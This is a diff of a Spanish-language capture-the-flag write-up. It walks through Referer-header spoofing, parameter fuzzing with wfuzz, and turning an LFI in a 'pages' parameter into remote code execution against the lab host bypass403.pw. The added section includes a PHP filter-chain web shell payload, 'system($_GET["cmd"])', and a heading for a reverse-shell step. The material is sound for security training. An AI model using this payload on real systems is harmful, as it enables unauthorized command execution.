@@ -22,7 +22,7 @@ Lo que nos dice que internamente el servidor tiene la ruta `bypass403.pw`, por l
 Una vez dentro, veremos que no tenemos acceso a la página.
 
 ## Paso N3: Fuzzeando parámetros 
-Como la idea es bypassear el código 500 de la página web, tendremos que buscar algún parametro vulnerable para poder realizar un **RCE**, por lo que usamos `wfuzz` agregando `-H "Referer: http://bypass403.pw"`, esto ya que el servidor permite acceso únicamente si el `Referer` coincide con su propio dominio.
+Como la idea es bypassear el código 500 de la página web, tendremos que buscar algún parametro vulnerable para poder realizar un **LFI**, por lo que usamos `wfuzz` agregando `-H "Referer: http://bypass403.pw"`, esto ya que el servidor permite acceso únicamente si el `Referer` coincide con su propio dominio.
 ```
 wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt --hl 38 -u http://bypass403.pw?FUZZ=test -H "Referer: http://bypass403.pw"
 ```
@@ -34,7 +34,15 @@ Encontramos que el parámetro vulnerable es `pages`, por lo que ahora podremos p
 Entraremos a **Burpsuite** y mandamos la petición al **Repeater**, agregando nuevamente la cabecera `Referer: http://bypass403.pw` y probando el parámetro `pages`
 <img width="1038" height="410" alt="image" src="https://github.com/user-attachments/assets/7fa76724-4431-4055-888f-04b3a16e192f" />
 
-Vemos que funciona correctamente. La idea a partir de acá es lograr inyectar código php, y la forma de hacerlo es usando un **PHP Wrapper**, el cual es una forma de ejecutar código php mediante la url. Para generar el código usaremos una herramienta llamada [`php_filter_chain_generator`](https://github.com/synacktiv/php_filter_chain_generator)
+Vemos que funciona correctamente. La idea a partir de acá es lograr inyectar código php, y la forma de hacerlo es usando un **PHP Wrapper**, el cual es una forma de ejecutar código php mediante la url. Para generar el código usaremos una herramienta llamada [`php_filter_chain_generator`](https://github.com/synacktiv/php_filter_chain_generator). Copiaremos el directorio el nuestra máquina con git clone y le subiremos el código que queremos queremos ejecutar
+```
+git clone https://github.com/synacktiv/php_filter_chain_generator
+python3 php_filter_chain_generator.py --chain '<?php system($_GET["cmd"]); ?>'
+```
+Esto nos generará un código gigante el cual tendremos que poner en el parámetro y luego deberíamos de poder ejecutar comando usando `&cmd=`
+<img width="1038" height="414" alt="image" src="https://github.com/user-attachments/assets/836561a6-5d37-42eb-b137-22c3d4234081" />
 
+Por lo que ya pudimos realizar un **RCE**
 
+## Paso N5: Generando reverse shell
 
